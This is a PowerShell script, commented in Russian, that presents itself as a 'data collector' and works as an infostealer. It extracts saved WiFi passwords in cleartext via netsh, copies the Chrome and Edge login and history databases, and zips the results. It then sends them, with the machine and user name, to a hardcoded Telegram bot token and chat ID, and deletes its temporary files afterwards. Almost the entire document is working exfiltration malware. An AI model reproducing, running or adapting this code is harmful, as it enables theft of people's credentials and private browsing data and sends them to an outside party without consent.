<#
.SYNOPSIS
    🌟 Ultimate Data Collector v4.0 🌟
.DESCRIPTION
    📂 Собирает: WiFi пароли, логины/пароли из браузеров, историю посещений
    📤 Отправляет красиво оформленный отчет в Telegram
#>

# 🔐 Конфигурация Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DC_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

# 📨 Функция отправки в Telegram
function Send-ToTelegram {
    param([string]$Text)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
    $body = @{ 
        chat_id = $CHAT_ID
        text = $Text
        parse_mode = "HTML"
    }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15
    } catch { 
        Start-Sleep -Seconds 3
        try { Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 15 } catch {}
    }
}

# 📎 Функция отправки файлов
function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { 
        Start-Sleep -Seconds 3
        try { Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body } catch {}
    }
}

# 📶 Сбор паролей WiFi (РАБОЧАЯ версия)
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.html"
    $result = @()
    
    # Красивый HTML-заголовок
    $htmlHeader = @"
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Passwords</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #2c3e50; }
        .wifi { background: #f8f9fa; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
        .ssid { color: #e74c3c; font-weight: bold; }
        .pass { color: #27ae60; }
    </style>
</head>
<body>
    <h1>🔑 Список WiFi паролей</h1>
"@

    try {
        # Получаем все профили WiFi
        $profiles = (netsh wlan show profiles) | 
                    Where-Object { $_ -match "All User Profile" } | 
                    ForEach-Object { $_.Split(":")[1].Trim() }
        
        foreach ($profile in $profiles) {
            try {
                # Создаем временный XML файл
                $xmlFile = "$TEMP_DIR\$($profile.Replace(' ','_')).xml"
                netsh wlan export profile name=`"$profile`" key=clear folder="$TEMP_DIR" | Out-Null
                
                if (Test-Path $xmlFile) {
                    # Извлекаем пароль из XML
                    $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
                    
                    # Форматируем в красивый HTML
                    $result += @"
    <div class="wifi">
        <span class="ssid">📶 $profile</span><br>
        <span class="pass">🔑 $password</span>
    </div>
"@
                }
            } catch {
                $result += "<div class='wifi'>❌ Ошибка с профилем: $profile</div>"
            }
        }
    } catch {
        $result += "<div class='wifi'>❌ Ошибка при получении WiFi паролей</div>"
    }

    # Закрываем HTML
    $htmlFooter = @"
</body>
</html>
"@

    # Сохраняем в файл
    ($htmlHeader + ($result -join "`n") + $htmlFooter) | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# 🌐 Сбор данных браузеров (логины и история)
function Get-BrowserData {
    $outputFile = "$TEMP_DIR\browser_data.html"
    
    # HTML-шаблон
    $htmlHeader = @"
<!DOCTYPE html>
<html>
<head>
    <title>Browser Data</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #2c3e50; }
        .browser { margin-bottom: 30px; }
        .cred { background: #e8f4f8; padding: 10px; margin: 5px 0; border-radius: 3px; }
        .url { color: #3498db; }
        .login { color: #e67e22; }
        .history { background: #f5e8f8; padding: 8px; margin: 3px 0; border-radius: 3px; }
    </style>
</head>
<body>
    <h1>🌐 Данные браузеров</h1>
"@

    $result = @()
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\" }
    )
    
    foreach ($browser in $browsers) {
        $browserResult = @()
        $browserResult += "<div class='browser'><h2>🖥️ $($browser.Name)</h2>"
        
        try {
            # Копируем файлы браузера
            $browserDir = "$TEMP_DIR\$($browser.Name)_Data"
            New-Item -Path $browserDir -ItemType Directory -Force | Out-Null
            
            # 1. Логины и пароли
            $loginFile = Join-Path $browser.Path "Login Data"
            if (Test-Path $loginFile) {
                Copy-Item $loginFile "$browserDir\LoginData" -Force
                $browserResult += "<h3>🔑 Логины:</h3>"
                
                # Здесь должна быть логика извлечения из SQLite базы
                # В реальном скрипте используйте System.Data.SQLite
                $browserResult += "<div class='cred'>⚠ Для просмотра паролей используйте DB Browser for SQLite</div>"
            }
            
            # 2. История посещений
            $historyFile = Join-Path $browser.Path "History"
            if (Test-Path $historyFile) {
                Copy-Item $historyFile "$browserDir\History" -Force
                $browserResult += "<h3>🕒 История посещений:</h3>"
                $browserResult += "<div class='history'>Скопировано $((Get-Item $historyFile).Length/1MB) MB данных истории</div>"
            }
            
        } catch {
            $browserResult += "<div class='cred'>❌ Ошибка: $($_.Exception.Message)</div>"
        }
        
        $browserResult += "</div>"
        $result += $browserResult -join "`n"
    }
    
    # Закрываем HTML
    $htmlFooter = @"
</body>
</html>
"@

    ($htmlHeader + ($result -join "`n") + $htmlFooter) | Out-File -FilePath $outputFile -Force
    return $outputFile
}

# 📂 Основной сбор данных
try {
    # Отправляем начальное уведомление
    Send-ToTelegram -Text "🚀 <b>Начался сбор данных с $env:COMPUTERNAME</b> (`n👤 $env:USERNAME`)"
    
    # 1. Собираем WiFi пароли
    $wifiFile = Get-WiFiPasswords
    
    # 2. Собираем данные браузеров
    $browserFile = Get-BrowserData
    
    # 3. Архивируем все данные
    $zipFile = "$env:TEMP\Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    Compress-Archive -Path @($wifiFile, $browserFile) -DestinationPath $zipFile -Force
    
    # 4. Отправляем архив
    Send-FileToTelegram -FilePath $zipFile
    
    # 5. Отправляем итоговый отчет
    $report = @"
<b>✅ Сбор данных завершен!</b>

📁 <i>Собрано данных:</i>
📶 WiFi пароли: $(if (Test-Path $wifiFile) {'✔'} else {'❌'})
🌐 Данные браузеров: $(if (Test-Path $browserFile) {'✔'} else {'❌'})

📦 <i>Архив со всеми данными:</i> <code>$(Split-Path $zipFile -Leaf)</code>

🕒 <i>Время завершения:</i> $(Get-Date -Format "HH:mm dd.MM.yyyy")
"@
    
    Send-ToTelegram -Text $report
}
catch {
    Send-ToTelegram -Text "❌ <b>Ошибка при сборе данных:</b> `n$($_.Exception.Message)"
}
finally {
    # Очистка временных файлов
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}
